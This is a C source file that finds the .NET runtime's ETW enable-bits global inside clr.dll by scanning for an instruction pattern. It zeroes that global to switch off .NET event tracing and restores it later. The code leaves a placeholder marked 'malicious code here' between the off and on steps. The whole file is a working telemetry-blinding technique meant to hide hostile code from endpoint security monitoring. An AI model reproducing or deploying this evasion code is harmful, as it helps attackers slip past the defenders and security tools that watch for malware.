#include <windows.h>

int getImageSize(void* imageBase) {
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)imageBase;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)imageBase + dos->e_lfanew);
    int sizeOfImage = nt->OptionalHeader.SizeOfImage;
    return sizeOfImage;
}

int* findDotNETRuntimeEnableBits(HMODULE clrBase) {
    int clrSize = getImageSize(clrBase);

    // assuming a max of 20 global variables that match the pattern
    int MAX = 20;
    int* globalVars[20] = { 0 };
    int globalVarCounts[20] = { 0 };

    for (int i = 0; i < clrSize; i++) {
        unsigned char* addr = (unsigned char*)clrBase + i;

        // matching "test cs:Microsoft_Windows_DotNETRuntimeEnableBits, 80000000h"
        if (addr[0] != 0xf7 || addr[1] != 0x5) {
            continue;
        }

        if (*(DWORD*)(addr + 6) != 0x80000000) {
            continue;
        }

        // calculating global var address
        unsigned char* rip = addr + 10;
        int offset = *(DWORD*)(addr + 2);
        int* globalVarAddr = (int*)(rip + offset);

        // storing frequency of potential vars that could be Microsoft_Windows_DotNETRuntimeEnableBits
        for (int i = 0; i < MAX; i ++) {
            if (globalVars[i] == 0) {
                globalVars[i] = globalVarAddr;
                globalVarCounts[i] = 1;
                break;
            }

            if (globalVars[i] == globalVarAddr) {
                globalVarCounts[i] += 1;
            }
        }
    }

    // return the most frequent var that is Microsoft_Windows_DotNETRuntimeEnableBits
    int mostFreq = 0;
    for (int i = 1; i < MAX; i ++) {
        if (globalVarCounts[mostFreq] < globalVarCounts[i]) {
            mostFreq = i;
        }
    }

    return globalVars[mostFreq];
}

void turnOffEtw(int* DotNETRuntimeEnableBits_addr, int* DotNETRuntimeEnableBits_val) {
    *DotNETRuntimeEnableBits_val = *DotNETRuntimeEnableBits_addr;
    *DotNETRuntimeEnableBits_addr = 0;
}

void turnOnEtw(int* DotNETRuntimeEnableBits_addr, int DotNETRuntimeEnableBits_val) {
    *DotNETRuntimeEnableBits_addr = DotNETRuntimeEnableBits_val;
}

int main() {
    HMODULE clrBase = LoadLibraryA("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll");
    int* DotNETRuntimeEnableBits_addr = findDotNETRuntimeEnableBits(clrBase);

    // because the CLR isn't initialized, there will be no DotNETRuntimeEnableBits value.
    int DotNETRuntimeEnableBits_val = 0;
    turnOffEtw(DotNETRuntimeEnableBits_addr, &DotNETRuntimeEnableBits_val);
    // malicious code here
    turnOnEtw(DotNETRuntimeEnableBits_addr, DotNETRuntimeEnableBits_val);
    
    return 0;
}